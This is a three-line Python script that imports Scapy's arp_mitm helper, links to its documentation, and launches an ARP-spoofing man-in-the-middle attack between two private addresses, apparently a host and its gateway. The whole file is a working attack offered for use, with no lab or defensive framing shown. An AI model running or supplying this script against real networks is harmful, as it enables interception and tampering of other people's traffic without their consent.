from scapy.layers.l2 import arp_mitm

# https://scapy.readthedocs.io/en/latest/api/scapy.layers.l2.html#scapy.layers.l2.arp_mitm
arp_mitm("172.18.20.79", "172.18.20.1")
